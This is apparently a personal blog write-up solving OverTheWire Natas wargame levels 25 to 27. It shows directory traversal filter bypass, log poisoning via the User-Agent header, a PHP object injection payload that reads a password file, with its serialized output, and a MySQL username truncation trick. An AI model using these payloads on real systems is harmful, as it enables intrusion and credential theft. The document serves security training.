---
layout: post
title: OverTheWire - Natas 25-28
---

Site: http://overthewire.org/wargames/natas/ <br>
Level: 25-28<br>
Situation: Basic Web <br><br>

### Natas 25
- - - - - - -

We are presented with a quote and a drop down that allows us to change the language of the quote. Looking at the source code we are we are presented with quite a bit.

{% highlight bash %}
function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
{% endhighlight %}

At first we know that the "lang" key is being utilized during the process.

We notice immediately that there is a directory transversal attack however we have a few things in our way the first one is a string replace that remove "../" from our path and the next is a restriction on including any string that contains "natas_webpass".

To get past the "../" filter we can fool it by doing the following "..././" What will happen is the replace with remove ../ and leave the . and ./ alone making "../" So we can do this to get past the directory transversal filter. The next issue however we will have to look else ware.

If we look at the log request function we notice that the log is gather addition info.

{% highlight bash %}
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
{% endhighlight %}

The date, message and our user agent is saved to a file called "/tmp/natas25_sessionid.log". We can't control message or date however we can control our USER_AGENT. This makes this vulnerable to log poisoning. We can switch our http user agent to include PHP code. Then use our directory transversal to view the file.

To keep this in our browser we will use a plugin called "User-Agent Switcher" and add a new entry.

![Embeded](/images/natas/screen9.png)
[FullSize](/images/natas/screen9.png)

Next we need to grab our session id. We do that by using the same cookie editor. After we have received that and we enabled our custom user agent all that is left is to execute an action that will create a log entry. For this simply entering "natas_webpass" into the lang field will do it.

After that all that is left is navigate to our temp log.

{% highlight bash %}
..././..././..././..././..././tmp/natas25_sessionid.log
{% endhighlight %}

When we navigate there our poisoned log executes our PHP script and we get the password.

### Natas 26
- - - - - - -

Note: This is an attack vector I would have never known about without researching the solution. 

When loaded we are presented with a simple form that takes integer values and when we click draw we get a line drawing from our input. Quick recon shows us that we have a PHP sessionid as well has a drawing cookie that contains information.

Looking at the source we are presented with quite a bit of information.

{% highlight bash %}
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
{% endhighlight %}

First we are presented with an innocent looking logger class. That isn't connected to anything. Followed by the image code.

{% highlight bash %}
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
{% endhighlight %}

Now at first it looks like we need to attack the file that is written however after looking at it. We notice that there is no sanitization occurring with the serializing and unserializing of the objects. This object is stored inside the drawing cookie. Because there is no sanitization on the deserialization of the object this makes it prone to PHP object injection.

In short PHP object injection allows us to locally create an object that resembles code on the webapp. There is however two reqs to this. The first being that there is an object that implements the __construct and __deconstruct methods. The second is an unsanitized deserialized. All we have to do now is create a similar object serialized it, base64 it and upload it.

{% highlight php %}
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
       
        function __construct(){
            $this->initMsg="";
            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
            $this->logFile = "img/code.php";
        }                       
                           
       
        function __destruct(){
            echo "destruct";
            echo $this->logFile;
            echo $this->exitMsg;
        }                       
    }

$obj = new Logger();
echo base64_encode(serialize($obj));

?>
{% endhighlight %}

After ran it gives us the following.

{% highlight bash %}
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL2hhY2tlZDIucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjE6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=destructimg/code.php<?php echo file_get_contents('/etc/natas_webpass/natas27');?>
{% endhighlight %}

After we replace drawing with our new object. We head back to the homepage. Then we just navigate to code.php and our password is displayed.

### Natas 27
- - - - - - -

ShoutOut: To [Foxx](https://iops.io) for poking this with me till stumbling upon the solution.

This one was deceiving. Natas27 presents us with a simple login form that creates new users if you enter a random username and password combination. Nothing to useful so we look at the source.

{% highlight bash %}
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 
function checkCredentials($link,$usr,$pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
    $query = "SELECT username from users where username='$user' and password='$password' "; 
    $res = mysql_query($query, $link); 
    if(mysql_num_rows($res) > 0){ 
        return True; 
    } 
    return False; 
} 
function validUser($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            return True; 
        } 
    } 
    return False; 
} 
function dumpData($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) { 
                return print_r($row); 
            } 
        } 
    } 
    return False; 
} 
function createUser($link, $usr, $pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
    $query = "INSERT INTO users (username,password) values ('$user','$password')"; 
    $res = mysql_query($query, $link); 
    if(mysql_affected_rows() > 0){ 
        return True; 
    } 
    return False; 
} 
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas27', '<censored>'); 
    mysql_select_db('natas27', $link); 
    if(validUser($link,$_REQUEST["username"])) { 
        //user exists, check creds 
 if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>"; 
            echo "Here is your data:<br>"; 
            $data=dumpData($link,$_REQUEST["username"]); 
            print htmlentities($data); 
        } 
        else{ 
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>"; 
        }         
    }  
    else { 
        //user doesn't exist 
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){  
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!"; 
        } 
    } 
    mysql_close($link); 
} else { 
?> 
{% endhighlight %}

At first our thought is it’s a SQL injection. However after much fighting and reading we learn that in the end it isn't possible. The combination of using mysql_real_escape_string and '' single quotes for the variables prevents any SQL injection from occurring no matter what encoding is preformed due to the fact that a single quote is needed to escape the string and no matter what encoding is presented mysql_real_escape_string will remove it.

So to find the solution we have to understand how certain SQL functions operate. 

So first we look at our check credentials function.

{% highlight bash %}
function checkCredentials($link,$usr,$pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass);    
    $query = "SELECT username from users where username='$user' and password='$password' "; 
    $res = mysql_query($query, $link); 
    if(mysql_num_rows($res) > 0){ 
        return True; 
    } 
    return False; 
} 
{% endhighlight %}

It simple calls a query for any username and password combination then checks if there is any number of rows that match. Interesting enough next we look at the create user function.

{% highlight bash %}
function createUser($link, $usr, $pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
    $query = "INSERT INTO users (username,password) values ('$user','$password')"; 
    $res = mysql_query($query, $link); 
    if(mysql_affected_rows() > 0){ 
        return True; 
    } 
    return False; 
} 
{% endhighlight %}

We immediately see that no SQL injection will happen however our username and password is added in the table without and checking. Also if we look back to the scheme we notice there is no "unique" constraint meaning that we can add the same username to the table.

So to put this all together the last bit we need to understand is the check user function.

{% highlight bash %}
function validUser($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            return True; 
        } 
    } 
    return False; 
} 
{% endhighlight %}

This function is simple enough all it does is check our directly passed in username for a match in the database if there isn't one it returns false.

The flow of the application is simple.

{% highlight bash %}
Receive Input -> Check if user exist -> ifexist check credentials -> show data.

Receive Input -> check if user exist -> if dosen't -> create user.
{% endhighlight %}

The key to this attack is mysql_fetch_assoc. Which returns all rows associated with a given query. For instance if we have multiple rows with the username "temp" it will return both rows. If we look at the dump data function. 

{% highlight bash %}
function dumpData($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) { 
                return print_r($row); 
            } 
        } 
    } 
    return False; 
} 
{% endhighlight %}

It is only getting the first row in the query and returning that to us. So if we were to have another row that contained a username natas28 it wouldn't be reached only the original natas28 data would be. So the trick is to create a new natas28 entry.

The key is in the way the user is validated and the restraint of the size of the data being inserted. So the input string we will use is the following. We will use Perl to generate our username. We also leave our password false.

{% highlight perl %}
perl -s 'print "natas28" . " "x64 . "a"'
{% endhighlight %}

So step by step here is what occurs.

1. First the user is validated to exist since it is natas28+64spaces+a the check returns false.

2. The next step is the user creation. Mysql trims the username to only the size that is allowed. So the insert value into the data base is now "natas28+57spaces".

3. After that we go back to the login page and insert natas28 as our user and a blank password. 

4. Password validation checks to see if a user with the username "natas28" and password that’s blank exist in the database. Now what happens is SQL strips our spaces during the check causing it to be true.

5. Finally when data dump runs it looks for all rows associated with natas28 and gets the original user row and the second row we mad. It then returns the first row which contains our password.